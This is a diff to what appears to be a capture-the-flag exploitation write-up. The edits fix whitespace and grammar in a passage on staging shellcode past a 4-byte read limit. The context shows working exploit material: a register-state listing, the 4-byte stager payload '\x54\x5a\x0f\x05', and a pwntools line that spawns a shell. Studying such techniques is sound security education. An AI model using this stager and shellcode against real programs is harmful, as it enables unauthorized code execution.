@@ -32,10 +32,10 @@ Anyway whichever function of any library is used to recive our input it will mos
 
 So at the precise moment in which we are asked for the input, the registers will be in this state
 ```bash
-$rax = 0x0			# syscall number
-$rdi = 0			# which is stdin 
-$rdx = 0x4			# max length
-$rsi = *shellcode	# will be pointing to the addres where our input will be stored
+$rax = 0x0             # syscall number
+$rdi = 0               # which is stdin 
+$rdx = 0x4             # max length
+$rsi = *shellcode      # will be pointing to the addres where our input will be stored
 ```
 We need to know that as soon as we send our shellcode the program will continue his execution moving the `$pc` to our shellcode, this means that no register (excluded `$pc`) will be touched so they are in the same status as they were before the *Syscall*.
 This means they are ready to be used to perform another reading operation of `0x4` bytes from `stdin` to the address pointed by `shellcode`, and this can be achieved by sending the *Syscall* opcode (`0x0f05`) as input.
@@ -52,7 +52,7 @@ The opcode of `push $RSP` and `pop $RDX` are respectively `0x54` and `0x5a` and 
 ```python
 payload = "\x54\x5a\x0f\x05"
 ```
-at this point we can send a **shell code** shorter than `0x7fffffffe058` bytes that will be executed starting from the 4th, [Pwntools](https://github.com/Gallopsled/pwntools) come to help now...
+at this point we can send a **shell code** shorter than `0x7fffffffe058` bytes that will be executed starting from the 4th, [Pwntools](https://github.com/Gallopsled/pwntools) comes to help now...
 ```python
 shellcode = b"\x90"*4 + asm(shellcraft.sh())
 ``` 
